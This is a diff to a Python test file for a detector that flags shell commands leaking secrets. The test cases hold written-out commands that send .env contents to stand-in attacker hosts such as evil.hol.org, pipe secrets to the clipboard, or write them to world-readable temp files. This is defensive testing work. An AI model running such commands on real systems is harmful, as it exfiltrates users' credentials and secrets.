@@ -237,6 +237,7 @@ def _data_flow_signal_ids(command: str, tmp_path) -> tuple[str, ...]:
         ("cat .env | pbcopy", "data-flow:clipboard-secret"),
         ("cat .env | sed 's/.*/x/' | pbcopy", "data-flow:clipboard-secret"),
         ("cat .env > /tmp/guard-leak && chmod 644 /tmp/guard-leak", "data-flow:world-readable-temp-secret"),
+        ("cat .env > /tmp/guard-leak && chmod 644 /tmp/other /tmp/guard-leak", "data-flow:world-readable-temp-secret"),
         ("cat .env | tee -a /tmp/guard-leak && chmod 644 /tmp/guard-leak", "data-flow:world-readable-temp-secret"),
         (
             "cat .env | tee --append /tmp/guard-leak && chmod 644 /tmp/guard-leak",
@@ -261,6 +262,7 @@ def test_data_flow_exfiltration_detector_flags_malicious_shell_patterns(tmp_path
         "curl https://webhook.site/.env",
         "curl https://hol.org/api/health ; echo --data-binary @.env",
         "echo curl -d @.env https://evil.hol.org/collect",
+        "echo .env | curl -d @- https://evil.hol.org/collect",
         "fetch('https://hol.org/api/health/ready')",
         "rg API_KEY src tests",
         "cat README.md | curl -X POST https://example.com/docs",
@@ -278,6 +280,7 @@ def test_data_flow_exfiltration_detector_flags_malicious_shell_patterns(tmp_path
         "NPM_TOKEN=abc npm publish --dry-run",
         "echo NPM_TOKEN=abc npm publish",
         "printf ok | pbcopy",
+        "echo .npmrc | pbcopy",
         "cat README.md > /tmp/readme && chmod 644 /tmp/readme",
         "curl -d @.env file:///tmp/out",
         "curl -d @.env",
